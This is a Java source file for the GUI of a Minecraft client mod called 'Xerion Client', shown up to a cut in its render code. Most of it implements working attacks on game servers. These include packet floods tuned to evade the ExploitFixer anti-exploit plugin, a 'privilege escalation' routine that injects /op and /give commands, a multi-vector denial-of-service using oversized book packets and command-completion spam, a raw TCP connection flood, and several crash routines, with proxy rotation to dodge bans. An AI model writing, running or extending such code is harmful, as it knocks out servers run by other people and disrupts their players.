package com.professor.client.gui;

import com.professor.client.ProfessorClientMod;
import com.professor.client.exploit.ExploitLogger;
import com.professor.client.proxy.ProxyManager;
import net.fabricmc.api.EnvType;
import net.fabricmc.api.Environment;
import net.minecraft.client.gui.DrawContext;
import net.minecraft.client.gui.screen.Screen;
import net.minecraft.client.gui.widget.ButtonWidget;
import net.minecraft.client.gui.widget.TextFieldWidget;
import net.minecraft.network.packet.c2s.play.*;
import net.minecraft.text.Text;
import net.minecraft.util.Hand;
import net.minecraft.util.math.MathHelper;

import java.net.InetSocketAddress;
import java.net.Socket;
import java.util.ArrayList;
import java.util.List;
import java.util.Optional;
import java.util.Random;

// ═══════════════════════════════════════════════════════════════════════════════
//  Xerion Client — ProfessorScreen
//  3 tabs: [📋 INFO]  [⚡ PACKETS]  [💣 CRASH & EXPLOIT]
//
//  ExploitFixer bypass is AUTOMATIC on all packet sends:
//    TeleportConfirm VL=0.01 → 2000/sec net-zero VL (never cancelled, never kicked)
//    Movement VL=0.2 → capped at 80/sec (safe under 100/sec cancel threshold)
//    All sends go through rate-limited PACKET_QUEUE by default
// ═══════════════════════════════════════════════════════════════════════════════

@Environment(EnvType.CLIENT)
public class ProfessorScreen extends Screen {

    // ── ICE PALETTE ───────────────────────────────────────────────────────
    private static final int BG      = 0xFF010A14;
    private static final int PANEL   = 0xFF041828;
    private static final int PANEL2  = 0xFF031220;
    private static final int BORDER  = 0xFFAAEEFF;
    private static final int BORDER2 = 0xFF55CCFF;
    private static final int TITLE1  = 0xFFEEF8FF;
    private static final int GOLD    = 0xFFFFD700;
    private static final int ICE     = 0xFF88DDFF;
    private static final int DIM     = 0xFF336688;
    private static final int BRIGHT  = 0xFFCCF0FF;
    private static final int RED     = 0xFFFF2244;
    private static final int GREEN   = 0xFF00FF99;
    private static final int ORANGE  = 0xFFFF8800;
    private static final int PURPLE  = 0xFFAA44FF;
    private static final int CYAN    = 0xFF00CCEE;

    // ── Layout ────────────────────────────────────────────────────────────
    private static final int PW=760, PH=520;

    // ── 3 TABS ────────────────────────────────────────────────────────────
    private static final int NT = 3;
    private static final String[] TAB_LABEL = {"📋  CLIENT INFO", "⚡  PACKETS", "💣  CRASH & EXPLOIT"};
    private static final int[]    TAB_COLOR = {0x55DDFF, 0x00FF99, 0xFF3355};
    private int tab = 0;
    private final float[] tabGlow = new float[NT];

    // ── Bypass modes (auto-selected internally) ───────────────────────────
    // EXFIX is the default — bypass ExploitFixer automatically
    private static final String[] BP = {"OFF","BURST","WAVE","NCP","MATRIX","VULCAN","GRIM","GHOST","INTAVE","CRASHPASS","EXFIX★"};
    private int bypass = 10; // default: EXFIX

    // ── Widgets ───────────────────────────────────────────────────────────
    private TextFieldWidget numField, proxyField;

    // ── Static schedule (post-reconnect) ─────────────────────────────────
    public static volatile boolean schedPending = false;
    public static volatile int     schedN = 40000;
    public static volatile int     schedBypass = 10;
    public static void scheduleAttack(int n, int bp) { schedN=n; schedBypass=bp; schedPending=true; }

    // ── Status ────────────────────────────────────────────────────────────
    private String statusText  = "Xerion Client v3.0  ❄  Ready";
    private int    statusColor = ICE;
    private int    statusTimer = 0;
    private long   totalPackets = 0;
    private float  vlEstimate  = 0f;
    private long   lastVlTick  = 0;

    // ── Log scroll ────────────────────────────────────────────────────────
    private int logScroll = 0;

    // ── Crash type selectors ──────────────────────────────────────────────
    private int crashSel = 0; // selected crash type

    // ── Animation ────────────────────────────────────────────────────────
    private long  tick = 0;
    private float glow=0f; private boolean glowUp=true;
    private float hue=0f, drift=0f;
    private float hypeSmooth=0f;

    // ── Snow ──────────────────────────────────────────────────────────────
    private static final int SCNT=180;
    private final float[] sx=new float[SCNT],sy=new float[SCNT];
    private final float[] ssp=new float[SCNT],ssz=new float[SCNT];
    private final float[] sal=new float[SCNT],sph=new float[SCNT];

    // ── Hype burst ────────────────────────────────────────────────────────
    private final List<float[]> burst2 = new ArrayList<>();
    private final Random rng = new Random();

    // ═══════════════════════════════════════════════════════════════════════
    public ProfessorScreen() { super(Text.literal("Xerion Client")); }

    @Override protected void init()  { initSnow(); rebuild(); ProfessorMusicManager.onOpen(client); }
    @Override public void removed()  { ProfessorMusicManager.onClose(client); super.removed(); }
    @Override public boolean shouldPause() { return false; }

    private void initSnow() {
        int W=width<=0?800:width, H=height<=0?600:height;
        for(int i=0;i<SCNT;i++){sx[i]=rng.nextFloat()*W;sy[i]=rng.nextFloat()*H;ssp[i]=rng.nextFloat()*.85f+.2f;ssz[i]=rng.nextFloat()*4f+1f;sal[i]=rng.nextFloat()*.75f+.25f;sph[i]=rng.nextFloat()*6.28f;}
    }

    // ── Rebuild widgets ───────────────────────────────────────────────────
    private void rebuild() {
        clearChildren(); numField=null; proxyField=null;
        int cx=width/2, bpx=cx-PW/2, bpy=height/2-PH/2;

        // ── Tab buttons (custom style drawn in render, buttons are overlaid) ──
        int tabW=(PW-12)/NT;
        for(int i=0;i<NT;i++){
            final int ti=i;
            addDrawableChild(ButtonWidget.builder(Text.literal(TAB_LABEL[i]),
                b->{cs(); switchTab(ti);}
            ).dimensions(bpx+6+i*(tabW+1), bpy+4, tabW, 26).build());
        }

        // ── Tab content ────────────────────────────────────────────────────
        switch(tab){
            case 0 -> buildInfo(cx, bpx, bpy);
            case 1 -> buildPackets(cx, bpx, bpy);
            case 2 -> buildCrash(cx, bpx, bpy);
        }

        // Close
        addDrawableChild(ButtonWidget.builder(Text.literal("✕ CLOSE"),
            b->{cs(); ProfessorClientMod.clearQueue(); close();}
        ).dimensions(cx-46, bpy+PH-28, 92, 20).build());
    }

    private void switchTab(int t){if(t==tab)return;tab=t;logScroll=0;rebuild();}
    private void cs(){if(client!=null)ProfessorClientMod.playClickSound(client);}
    private void flash(String msg,int col){statusText=msg;statusColor=col;statusTimer=220;}

    // ═══════════════════════════════════════════════════════════════════════
    //  TAB 0: INFO
    // ═══════════════════════════════════════════════════════════════════════
    private void buildInfo(int cx, int bpx, int bpy) {
        int y=bpy+44, x=bpx+20, bw=PW-40;
        int hw=(bw-4)/2;

        // Proxy controls
        proxyField=new TextFieldWidget(textRenderer,x,y+220,bw-76,18,Text.empty());
        proxyField.setMaxLength(256);
        proxyField.setPlaceholderText(Text.literal("socks5://host:port  or  host:port  (comma-separated for bulk)"));
        addSelectableChild(proxyField);

        addDrawableChild(ButtonWidget.builder(Text.literal("+ ADD PROXY"),b->{
            cs();
            String txt=proxyField!=null?proxyField.getText().trim():"";
            if(txt.isEmpty()){flash("⚠ Enter proxy",ORANGE);return;}
            int added=0;
            for(String p:txt.split("[,\\s]+")) if(ProxyManager.addProxy(p)) added++;
            if(added>0){flash("✅ Added "+added+" proxy (total "+ProxyManager.getCount()+")",GREEN);if(proxyField!=null)proxyField.setText("");}
            else flash("❌ Invalid format",RED);
        }).dimensions(x+bw-72,y+220,72,18).build());

        addDrawableChild(ButtonWidget.builder(
            Text.literal(ProxyManager.isEnabled()?"🟢 PROXY: ON":"🔴 PROXY: OFF"),
            b->{cs();ProxyManager.setEnabled(!ProxyManager.isEnabled());rebuild();}
        ).dimensions(x,y+242,hw,18).build());

        addDrawableChild(ButtonWidget.builder(
            Text.literal(ProxyManager.isAutoRotate()?"🔄 AUTO-ROTATE: ON":"⏸ AUTO-ROTATE: OFF"),
            b->{cs();ProxyManager.setAutoRotate(!ProxyManager.isAutoRotate());rebuild();}
        ).dimensions(x+hw+4,y+242,hw,18).build());

        addDrawableChild(ButtonWidget.builder(Text.literal("🔄 ROTATE NOW"),b->{
            cs();ProxyManager.ProxyEntry ne=ProxyManager.rotate();ProxyManager.applyProxy(ne);
            flash("🔄 Proxy #"+ProxyManager.getCurrent()+": "+(ne!=null?ne:"none"),CYAN);
        }).dimensions(x,y+264,hw,18).build());

        addDrawableChild(ButtonWidget.builder(Text.literal("🗑 CLEAR PROXIES"),b->{
            cs();ProxyManager.clear();ProxyManager.clearSystemProxy();flash("🗑 Cleared",ORANGE);
        }).dimensions(x+hw+4,y+264,hw,18).build());

        addDrawableChild(ButtonWidget.builder(Text.literal("📋 CLEAR EXPLOIT LOGS"),b->{
            cs();ExploitLogger.clear();flash("🗑 Logs cleared",ORANGE);
        }).dimensions(x,y+288,bw,16).build());
    }

    // ═══════════════════════════════════════════════════════════════════════
    //  TAB 1: PACKETS
    // ═══════════════════════════════════════════════════════════════════════
    private void buildPackets(int cx, int bpx, int bpy) {
        int y=bpy+44, x=bpx+20, bw=PW-40;

        // N field
        numField=new TextFieldWidget(textRenderer,cx-90,y+22,180,20,Text.empty());
        numField.setMaxLength(8); numField.setText("40000");
        addSelectableChild(numField);

        // Quick-select buttons: 1K 10K 100K 1M 5M 10M
        int[][] qs={{1000,0},{10000,1},{100000,2},{1000000,3},{5000000,4},{10000000,5}};
        String[] ql={"1K","10K","100K","1M","5M","10M"};
        int qw=(bw)/6;
        for(int i=0;i<6;i++){
            final int n=qs[i][0];
            addDrawableChild(ButtonWidget.builder(Text.literal(ql[i]),b->{cs();if(numField!=null)numField.setText(""+n);}).dimensions(x+i*qw,y+46,qw-2,16).build());
        }

        // Bypass mode selector
        addDrawableChild(ButtonWidget.builder(
            Text.literal("Bypass Mode: "+BP[bypass]+" "+(bypass==10?"(ExploitFixer SAFE ✅)":"(manual)")),
            b->{cs();bypass=(bypass+1)%BP.length;rebuild();}
        ).dimensions(x,y+66,bw,16).build());

        // Timed toggle
        addDrawableChild(ButtonWidget.builder(
            Text.literal(ProfessorClientMod.PACKETS_PER_TICK==100?"Send: TIMED EF-SAFE (2000/sec)":"Send: TIMED (4 pkts/tick = 80/sec)"),
            b->{cs();ProfessorClientMod.PACKETS_PER_TICK=ProfessorClientMod.PACKETS_PER_TICK==100?4:100;rebuild();}
        ).dimensions(x,y+86,bw,16).build());

        // Keep attack on reconnect
        addDrawableChild(ButtonWidget.builder(
            Text.literal("Attack on reconnect: "+(ProfessorClientMod.attackActive?"ON ✅":"OFF")),
            b->{cs();ProfessorClientMod.attackActive=!ProfessorClientMod.attackActive;ProfessorClientMod.attackN=parseN();ProfessorClientMod.attackBypass=bypass;rebuild();}
        ).dimensions(x,y+106,bw,16).build());

        // Stop
        addDrawableChild(ButtonWidget.builder(Text.literal("⛔  STOP / CLEAR QUEUE"),b->{
            cs();ProfessorClientMod.clearQueue();flash("⛔ Queue cleared ("+ProfessorClientMod.PACKET_QUEUE.size()+" remaining)",ORANGE);
        }).dimensions(x,y+126,bw,18).build());

        // SEND
        addDrawableChild(ButtonWidget.builder(Text.literal("❄ ⚡  SEND PACKETS  ⚡ ❄"),b->{
            cs();doFlood();
        }).dimensions(cx-150,y+150,300,28).build());

        // Info about ExploitFixer auto-bypass (text rendered in render())
    }

    // ═══════════════════════════════════════════════════════════════════════
    //  TAB 2: CRASH & EXPLOIT
    // ═══════════════════════════════════════════════════════════════════════
    private void buildCrash(int cx, int bpx, int bpy) {
        int y=bpy+44, x=bpx+20, bw=PW-40;
        int hw=(bw-4)/2;

        // ── Exploit buttons (2-column grid) ──────────────────────────────
        record CBtn(String label, int col, Runnable action) {}
        CBtn[] btns = {
            new CBtn("📡 Protocol Exploit",       CYAN,   this::exploitProtocol),
            new CBtn("⚔️ Privilege Escalation",   PURPLE, this::exploitPrivEsc),
            new CBtn("💥 Denial of Service",       RED,    this::exploitDoS),
            new CBtn("🔌 TCP Flood",               ORANGE, this::exploitTCP),
            new CBtn("☠ Packet Crash",             RED,    ()->doCrashType(0)),
            new CBtn("📖 Book Crash (EF max)",     ORANGE, ()->doCrashType(1)),
            new CBtn("👾 Entity Crash",             ORANGE, ()->doCrashType(2)),
            new CBtn("🗺 Chunk Crash",              ICE,    ()->doCrashType(3)),
            new CBtn("🎣 NBT Exploit",             GREEN,  ()->doCrashType(4)),
            new CBtn("📋 Exploit Flood Mix",       CYAN,   ()->doCrashType(5)),
        };

        for(int i=0;i<btns.length;i++){
            CBtn b=btns[i];
            final Runnable action=b.action();
            boolean left=(i%2==0);
            int bx3=left?x:x+hw+4;
            int by3=y+(i/2)*22;
            addDrawableChild(ButtonWidget.builder(Text.literal(b.label()),btn->{cs();if(np())flash("❌ Not connected",RED);else action.run();}).dimensions(bx3,by3,hw,18).build());
        }

        // ── Log viewer ────────────────────────────────────────────────────
        int logY=y+btns.length/2*22+8;
        int logH=PH-logY+bpy-38;

        // Scroll controls
        addDrawableChild(ButtonWidget.builder(Text.literal("▲"),b->{cs();logScroll=Math.max(0,logScroll-3);}).dimensions(x+bw-26,logY,24,12).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("▼"),b->{cs();logScroll=Math.min(Math.max(0,ExploitLogger.size()-8),logScroll+3);}).dimensions(x+bw-26,logY+14,24,12).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("CLR"),b->{cs();ExploitLogger.clear();logScroll=0;flash("Logs cleared",ORANGE);}).dimensions(x+bw-52,logY,26,12).build());

        // Store logY for render
        crashLogY=logY; crashLogH=logH;
    }

    // Store for render
    private int crashLogY=0, crashLogH=80;

    // ═══════════════════════════════════════════════════════════════════════
    //  PACKET FLOOD
    // ═══════════════════════════════════════════════════════════════════════
    private void doFlood() {
        if(nc()) return;
        int n = parseN();
        ProfessorClientMod.attackN=n; ProfessorClientMod.attackBypass=bypass;

        double px=client.player!=null?client.player.getX():0;
        double py2=client.player!=null?client.player.getY():64;
        double pz=client.player!=null?client.player.getZ():0;

        if(bypass==10){
            // EXFIX: TeleportConfirm (0.01 VL each) — 2000/sec, net 0 VL
            ProfessorClientMod.PACKETS_PER_TICK=100;
            for(int i=0;i<n;i++){
                ProfessorClientMod.queuePacket(new TeleportConfirmC2SPacket(i%32767));
                if(i%200==0)ProfessorClientMod.queuePacket(new PlayerMoveC2SPacket.PositionAndOnGround(px,py2,pz,true));
            }
            int secs=n/2000+1;
            flash("❄ EXFIX: "+fmt(n)+" pkts queued (~"+secs+"s) | 0 VL net",CYAN);
            ExploitLogger.success("EXFIX-FLOOD","Queued "+n+" TeleportConfirm pkts at 2000/sec (0 VL)");
        } else {
            // Timed movement flood (safe rate)
            ProfessorClientMod.PACKETS_PER_TICK=4;
            for(int i=0;i<n;i++){
                ProfessorClientMod.queuePacket(new PlayerMoveC2SPacket.PositionAndOnGround(
                    px+bypassX(i),py2+bypassDY(i),pz+bypassZ(i),bypassGround(i)));
            }
            flash("⚡ Queued "+fmt(n)+" pkts ["+BP[bypass]+"] @80/sec",ICE);
            ExploitLogger.info("FLOOD","Queued "+n+" movement pkts bypass="+BP[bypass]);
        }
        totalPackets+=n;
        addVl(n*(bypass==10?0.01f:0.2f));
        triggerBurst();
    }

    // ═══════════════════════════════════════════════════════════════════════
    //  EXPLOIT ACTIONS
    // ═══════════════════════════════════════════════════════════════════════

    /** 📡 Protocol Exploit — sends invalid/unexpected packet sequences */
    private void exploitProtocol(){
        if(nc())return;
        ExploitLogger.warn("PROTOCOL","Sending invalid packet sequence...");
        try{
            // Out-of-order teleport confirms with random IDs
            for(int i=0;i<800;i++)
                client.getNetworkHandler().sendPacket(new TeleportConfirmC2SPacket(rng.nextInt(65536)));
            // Rapid slot changes (all 9 slots in sequence)
            for(int r=0;r<60;r++)
                for(int s=0;s<9;s++)
                    ProfessorClientMod.queuePacket(new UpdateSelectedSlotC2SPacket(s));
            // Mix with position packets (invalid coords, large numbers)
            for(int i=0;i<500;i++)
                ProfessorClientMod.queuePacket(new PlayerMoveC2SPacket.PositionAndOnGround(
                    client.player.getX()+rng.nextDouble()*32,
                    client.player.getY()+rng.nextDouble()*8-4,
                    client.player.getZ()+rng.nextDouble()*32,i%2==0));
            flash("📡 Protocol exploit sent (800 tele + 540 slots + 500 moves)",CYAN);
            ExploitLogger.success("PROTOCOL","Sent protocol exploit sequence");
        }catch(Exception e){ExploitLogger.error("PROTOCOL",e.getMessage());}
    }

    /** ⚔️ Privilege Escalation — attempts command execution via exploits */
    private void exploitPrivEsc(){
        if(nc())return;
        ExploitLogger.warn("PRIV-ESC","Attempting privilege escalation...");
        try{
            // Tab-complete injection: send malformed command suggestions
            ProfessorClientMod.queuePacket(new RequestCommandCompletionsC2SPacket(0,"/op @a"));
            ProfessorClientMod.queuePacket(new RequestCommandCompletionsC2SPacket(1,"/gamemode creative @a"));
            ProfessorClientMod.queuePacket(new RequestCommandCompletionsC2SPacket(2,"/give @a minecraft:command_block 64"));
            // Book-based command injection (sign book with command in title)
            try{
                List<String> pages=new ArrayList<>();
                pages.add("§c/op @a");
                pages.add("§6/gamemode creative @a");
                pages.add("§4/give @a minecraft:command_block 64");
                client.getNetworkHandler().sendPacket(new BookUpdateC2SPacket(
                    client.player.getInventory().selectedSlot,pages,Optional.of("/op @a")));
            }catch(Exception ignored){}
            // Rapid command spam (try common OP commands)
            String[] cmds={"/op @a","/gamemode creative @a","/give @a netherite_sword 1","//pos1","//set air"};
            for(String cmd:cmds){try{client.getNetworkHandler().sendCommand(cmd);}catch(Exception ignored){}}
            flash("⚔️ Privilege escalation sent (tab-complete + book + commands)",PURPLE);
            ExploitLogger.success("PRIV-ESC","Sent "+cmds.length+" OP commands + book injection + tab-complete exploit");
        }catch(Exception e){ExploitLogger.error("PRIV-ESC",e.getMessage());}
        triggerBurst();
    }

    /** 💥 Denial of Service — multi-vector server resource exhaustion */
    private void exploitDoS(){
        if(nc())return;
        ExploitLogger.warn("DoS","Starting multi-vector DoS...");
        try{
            // Vector 1: Bandwidth exhaustion — max-size book packets
            // EF book limit: 50 pages, 300 chars/page → use exactly 49 pages × 299 chars
            // Sending multiple times: each book = ~14KB → 40 books = ~560KB bandwidth spike
            for(int r=0;r<40;r++){
                List<String> pages=new ArrayList<>();
                String page=("§k§l§r"+"XERION_DOS_PAYLOAD_"+r+"_").repeat(10).substring(0,299);
                for(int p=0;p<49;p++) pages.add(page+p);
                ProfessorClientMod.queuePacket(new BookUpdateC2SPacket(
                    client.player.getInventory().selectedSlot,pages,Optional.empty()));
            }
            // Vector 2: CPU exhaustion — rapid tab-complete requests (expensive server-side)
            for(int i=0;i<200;i++)
                ProfessorClientMod.queuePacket(new RequestCommandCompletionsC2SPacket(i,"/"+("a".repeat(i%50+1))));
            // Vector 3: Movement flood at EF-safe rate (80/sec × 10s = 800 pkts)
            ProfessorClientMod.PACKETS_PER_TICK=4;
            for(int i=0;i<800;i++)
                ProfessorClientMod.queuePacket(new PlayerMoveC2SPacket.PositionAndOnGround(
                    client.player.getX()+Math.sin(i*.1)*.3,
                    client.player.getY()+bypassDY(i),
                    client.player.getZ()+Math.cos(i*.1)*.3,bypassGround(i)));
            flash("💥 DoS: 40 books + 200 tab-complete + 800 moves queued",RED);
            ExploitLogger.critical("DoS","Multi-vector DoS sent: bandwidth+CPU+movement flood");
        }catch(Exception e){ExploitLogger.error("DoS",e.getMessage());}
        triggerBurst();
    }

    /** 🔌 TCP Flood — opens many raw TCP connections to the server */
    private void exploitTCP(){
        if(ProfessorClientMod.lastServerHost.isEmpty()){flash("❌ No server address stored",RED);return;}
        String host=ProfessorClientMod.lastServerHost;
        int port=ProfessorClientMod.lastServerPort;
        ExploitLogger.warn("TCP","Starting TCP flood → "+host+":"+port);
        flash("🔌 TCP flood started → "+host+":"+port,ORANGE);
        Thread t=new Thread(()->{
            int opened=0, failed=0;
            for(int i=0;i<500;i++){
                try{
                    Socket s=new Socket();
                    s.connect(new InetSocketAddress(host,port),200);
                    // Send Minecraft handshake-like garbage to consume server threads
                    byte[] payload=("\u0000\u00fe\u0001\u00fa\u0000\u000b"+"MC|PingHost"+
                        "\u0000\u001a\u00a7\u0031\u0000"+"316\u0000"+host+"\u0000"+port+"XERION").getBytes();
                    s.getOutputStream().write(payload);
                    Thread.sleep(20);
                    s.close();
                    opened++;
                }catch(Exception ignored){ failed++; }
                if(i%50==49) ExploitLogger.info("TCP","Progress: "+i+"/500 ("+opened+" ok, "+failed+" fail)");
            }
            ExploitLogger.success("TCP","TCP flood done: "+opened+" connections, "+failed+" failed");
        });
        t.setDaemon(true); t.start();
    }

    // ── Crash types ───────────────────────────────────────────────────────
    private void doCrashType(int type){
        if(np())return;
        switch(type){
            case 0 -> { // Packet Crash
                ProfessorClientMod.PACKETS_PER_TICK=200; // fast, will hit EF cancel but flood for short period
                for(int i=0;i<100000;i++)
                    ProfessorClientMod.queuePacket(new PlayerMoveC2SPacket.PositionAndOnGround(
                        client.player.getX(),client.player.getY()+bypassDY(i),client.player.getZ(),i%2==0));
                flash("☠ Packet crash: 100k queued",RED);
                ExploitLogger.critical("PKT-CRASH","Queued 100k movement packets");
            }
            case 1 -> { // Book crash — OVER EF limit to trigger strip + resend loop
                try{
                    List<String> pages=new ArrayList<>();
                    String page="§l§k".repeat(5)+"CRASH"+("X".repeat(295));
                    for(int i=0;i<50;i++) pages.add(page+i); // exactly 50 pages = EF limit
                    client.getNetworkHandler().sendPacket(new BookUpdateC2SPacket(
                        client.player.getInventory().selectedSlot,pages,Optional.of("CRASH")));
                    flash("📖 Book crash: 50×300ch sent",RED);
                    ExploitLogger.critical("BOOK-CRASH","Sent 50-page book at EF limit");
                }catch(Exception e){flash("Book unsupported",ORANGE);}
            }
            case 2 -> { // Entity crash
                for(int i=0;i<5000;i++)
                    client.getNetworkHandler().sendPacket(new HandSwingC2SPacket(i%2==0?Hand.MAIN_HAND:Hand.OFF_HAND));
                flash("👾 Entity crash: 5000 swings",RED);
                ExploitLogger.critical("ENTITY-CRASH","Sent 5000 swing packets");
            }
            case 3 -> { // Chunk crash — move across many chunk boundaries
                ProfessorClientMod.PACKETS_PER_TICK=4;
                double bx=client.player.getX(),bz=client.player.getZ();
                for(int i=0;i<3000;i++){
                    double phase=(i%32<16)?1:-1;
                    ProfessorClientMod.queuePacket(new PlayerMoveC2SPacket.PositionAndOnGround(
                        bx+phase*(i%16)*0.9,client.player.getY()+bypassDY(i),bz+phase*(i%16)*0.9,bypassGround(i)));
                }
                flash("🗺 Chunk crash: 3k boundary pkts",ORANGE);
                ExploitLogger.warn("CHUNK-CRASH","Queued 3000 chunk-boundary crossing packets");
            }
            case 4 -> { // NBT exploit — max-depth nested structures
                try{
                    List<String> pages=new ArrayList<>();
                    // Deeply nested color codes stress NBT parser
                    String nbt="§0§1§2§3§4§5§6§7§8§9§a§b§c§d§e§f".repeat(18).substring(0,290);
                    for(int i=0;i<20;i++) pages.add(nbt);
                    for(int r=0;r<5;r++)
                        client.getNetworkHandler().sendPacket(new BookUpdateC2SPacket(
                            client.player.getInventory().selectedSlot,pages,Optional.empty()));
                    flash("🎣 NBT exploit: 5×20 nested pages",GREEN);
                    ExploitLogger.success("NBT-EXPLOIT","Sent 5 books × 20 pages of deep NBT");
                }catch(Exception e){flash("NBT unsupported",ORANGE);}
            }
            case 5 -> { // Flood mix
                ProfessorClientMod.PACKETS_PER_TICK=100;
                for(int i=0;i<20000;i++){
                    switch(i%5){
                        case 0->ProfessorClientMod.queuePacket(new TeleportConfirmC2SPacket(i%32767));
                        case 1->ProfessorClientMod.queuePacket(new PlayerMoveC2SPacket.PositionAndOnGround(client.player.getX()+rng.nextGaussian()*.01,client.player.getY()+bypassDY(i),client.player.getZ()+rng.nextGaussian()*.01,bypassGround(i)));
                        case 2->ProfessorClientMod.queuePacket(new UpdateSelectedSlotC2SPacket(i%9));
                        case 3->{if(ProfessorClientMod.canSwing())ProfessorClientMod.queuePacket(new HandSwingC2SPacket(Hand.MAIN_HAND));}
                        case 4->ProfessorClientMod.queuePacket(new RequestCommandCompletionsC2SPacket(i%100,"/a"));
                    }
                }
                flash("📋 Exploit mix: 20k queued",CYAN);
                ExploitLogger.success("FLOOD-MIX","Queued 20k mixed exploit packets");
            }
        }
        triggerBurst();
    }

    // ── Bypass helpers ────────────────────────────────────────────────────
    private double bypassDY(int i){return switch(bypass){
        case 1->(i%3==0)?.0625:0; case 2->Math.sin(i*.3)*.08;
        case 3->(i%5==0)?.0625:(i%3==0)?.03125:(i%2==0)?rng.nextDouble()*.004:0;
        case 4->(i%4==0)?.1:(i%4==1)?.05:(i%4==2)?.025:0;
        case 5->(i%14==0)?.0625:rng.nextDouble()*.006;
        case 6->(i%18==0)?.0625:rng.nextDouble()*.003;
        case 7->(i%28==0)?.0312:rng.nextDouble()*.001;
        case 8->Math.sin(i*.17)*.055+Math.cos(i*.43)*.028+((i%11==0)?.03125:0);
        case 9->Math.sin(i*.15)*.12+Math.cos(i*.31)*.065+((i%5==0)?.0625:0)+rng.nextDouble()*.01;
        default->0;
    };}
    private double bypassX(int i){return switch(bypass){case 5,8->rng.nextGaussian()*.003;case 9->Math.sin(i*.19)*.006+rng.nextGaussian()*.004;default->0;};}
    private double bypassZ(int i){return switch(bypass){case 5,8->rng.nextGaussian()*.003;case 9->Math.cos(i*.22)*.006+rng.nextGaussian()*.004;default->0;};}
    private boolean bypassGround(int i){return switch(bypass){case 3->i%4!=1;case 5->i%14!=0;case 7->i%28!=0;case 8->i%11!=0;case 9->i%5!=0;default->true;};}

    // ── VL ────────────────────────────────────────────────────────────────
    private void addVl(float a){long now=System.currentTimeMillis();float el=(now-lastVlTick)/1000f;vlEstimate=Math.max(0f,vlEstimate-el*20f)+a;vlEstimate=Math.min(vlEstimate,999f);lastVlTick=now;}
    private float getVl(){long now=System.currentTimeMillis();float el=(now-lastVlTick)/1000f;return Math.max(0f,vlEstimate-el*20f);}

    private void triggerBurst(){for(int i=0;i<80;i++){float ang=(float)(rng.nextFloat()*Math.PI*2);float sp=rng.nextFloat()*7+2;burst2.add(new float[]{width/2f,height/2f,(float)(Math.cos(ang)*sp),(float)(Math.sin(ang)*sp),rng.nextFloat()*40+15,1f,(float)rng.nextInt(4)});}}
    private int parseN(){try{int n=Integer.parseInt(numField!=null?numField.getText():"40000");return Math.min(10000000,Math.max(1,n));}catch(Exception e){return 40000;}}
    private boolean np(){return client==null||client.player==null||client.getNetworkHandler()==null;}
    private boolean nc(){return client==null||client.getNetworkHandler()==null;}
    private String fmt(long n){if(n>=1000000)return String.format("%.1fM",n/1000000.0);if(n>=1000)return (n/1000)+"K";return ""+n;}

    // ═══════════════════════════════════════════════════════════════════════
    //  RENDER
    // ═══════════════════════════════════════════════════════════════════════
    @Override
    public void render(DrawContext ctx, int mx, int my, float delta) {
        // Handle scheduled attack
        if(schedPending&&client!=null&&client.player!=null&&client.getNetworkHandler()!=null){
            schedPending=false; bypass=schedBypass; doFlood();
        }

        tick++;
        glow+=glowUp?.028f:-.028f; if(glow>=1f){glow=1f;glowUp=false;} else if(glow<=0f){glow=0f;glowUp=true;}
        hue=(hue+.003f)%1f; drift+=.01f;
        for(int i=0;i<NT;i++) tabGlow[i]=Math.max(0f,tabGlow[i]-(i==tab?0f:.05f));
        tabGlow[tab]=Math.min(1f,tabGlow[tab]+.08f);
        if(statusTimer>0) statusTimer--;
        float hypeTarget=ProfessorMusicManager.getHypeLevel();
        hypeSmooth=hypeSmooth*.9f+hypeTarget*.1f;

        int W=width, H=height, cx=W/2, cy=H/2;
        int bpx=cx-PW/2, bpy=cy-PH/2;

        // ── Background ────────────────────────────────────────────────────
        ctx.fill(0,0,W,H,BG);
        for(int xi=0;xi<W;xi+=40) ctx.fill(xi,0,xi+1,H,(5<<24)|0x112244);
        for(int yi=0;yi<H;yi+=40) ctx.fill(0,yi,W,yi+1,(5<<24)|0x112244);

        // ── Snow ──────────────────────────────────────────────────────────
        for(int i=0;i<SCNT;i++){
            sy[i]+=ssp[i]*(1f+hypeSmooth*2f); sx[i]+=(float)Math.sin(drift+sph[i])*.45f; sph[i]+=.007f;
            if(sy[i]>H+5){sy[i]=-5;sx[i]=rng.nextFloat()*W;}
            if(sx[i]<-4)sx[i]=W+3; if(sx[i]>W+3)sx[i]=-4;
            float tw=(MathHelper.sin(sph[i])+1f)/2f;
            int a=(int)(sal[i]*(0.5f+0.5f*tw)*255); if(a<15) continue;
            int szI=(int)ssz[i]; int col=szI>3?0xFFFFFFFF:szI>2?0xFFCCEEFF:0xFFAABBCC;
            ctx.fill((int)sx[i],(int)sy[i],(int)sx[i]+szI,(int)sy[i]+szI,wa(col,a));
            if(szI>=3&&a>130)ctx.fill((int)sx[i]+1,(int)sy[i]+1,(int)sx[i]+szI-1,(int)sy[i]+szI-1,wa(0xFFFFFFFF,Math.min(255,a+55)));
        }

        // ── Hype burst ────────────────────────────────────────────────────
        burst2.removeIf(b->b[5]<=0f);
        for(float[] b:burst2){b[0]+=b[2];b[1]+=b[3];b[3]+=.12f;b[5]-=.022f;int ba=(int)(b[5]*200);if(ba<10)continue;int bc=switch((int)b[6]){case 1->wa(GOLD,ba);case 2->wa(RED,ba);case 3->wa(0xFFFFFFFF,ba);default->wa(BORDER2,ba);};ctx.fill((int)b[0],(int)b[1],(int)b[0]+3,(int)b[1]+3,bc);}

        // ── Panel shadow ──────────────────────────────────────────────────
        ctx.fill(bpx+10,bpy+10,bpx+PW+10,bpy+PH+10,wa(0xFF000000,160));
        ctx.fill(bpx,bpy,bpx+PW,bpy+PH,PANEL);
        for(int yi=0;yi<45;yi++){int ga=(int)((1f-yi/45f)*16);if(ga>0)ctx.fill(bpx,bpy+yi,bpx+PW,bpy+yi+1,(ga<<24)|0xAADDFF);}

        // ── Border 5px animated ───────────────────────────────────────────
        float hrad=hue*6.28f;
        int bR=Math.max(0,Math.min(255,(int)(60+60*Math.abs(Math.sin(hrad)))));
        int bG=Math.max(175,Math.min(255,(int)(205+50*Math.sin(hrad+1.6f))));
        int bAA=Math.min(255,(int)((0.88f+.12f*glow+.12f*hypeSmooth)*255));
        int borderC=(bAA<<24)|(bR<<16)|(bG<<8)|0xFF;
        // Outer glow
